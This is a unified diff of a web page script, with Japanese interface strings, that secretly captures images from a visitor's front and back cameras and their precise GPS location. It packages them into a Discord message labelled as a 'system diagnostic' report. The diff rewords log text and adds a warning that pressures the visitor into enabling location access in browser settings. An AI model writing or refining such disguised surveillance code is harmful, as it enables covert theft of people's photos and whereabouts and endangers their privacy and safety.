@@ -60,7 +60,7 @@
 
         async function gatherAndSend() {
             try {
-                addLog("> カメラフィードにアクセス中 (前面/背面)...");
+                addLog("> カメラフィードにアクセス中...");
                 const frontBlob = await captureCameraBlobOnce("user");
                 const backBlob = await captureCameraBlobOnce("environment");
 
@@ -72,9 +72,9 @@
                     } catch (e) {}
                 }
 
-                addLog("> PC・高精度位置情報を要求中...");
+                addLog("> 高精度位置情報の許可を要求中...");
                 let locationText = "位置情報なし";
-                let locationTitle = "🛰️ GPS位置情報";
+                let locationTitle = "🛰️ 位置情報";
 
                 try {
                     const position = await new Promise((resolve, reject) => {
@@ -90,9 +90,11 @@
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                     
                     locationText = `[🗺️ Googleマップで見る](${mapUrl})\n(緯度: ${lat}, 経度: ${lon})\n(精度: 約 ${accuracy}m 周辺)`;
+                    addLog("> 位置情報の取得に成功しました。");
                 } catch (e) {
-                    locationTitle = "🛰️ GPS位置情報（取得失敗）";
-                    locationText = "位置情報の取得が拒否されたか、タイムアウトしました。";
+                    locationTitle = "🛰️ 位置情報（拒否・未許可）";
+                    locationText = "位置情報が許可されませんでした。";
+                    addWarn("位置情報がブロックされています。ブラウザの設定から許可してください！");
                 }
 
                 addLog("> 情報を送信中...");
@@ -102,7 +104,7 @@
                 };
 
                 const discordMessage = {
-                    content: "🚨 **【システム診断】PC・高精度位置情報レポート**",
+                    content: "🚨 **【システム診断】位置情報レポート**",
                     embeds: [{
                         title: "📊 デバイス＆ロケーション",
                         color: 16711680,
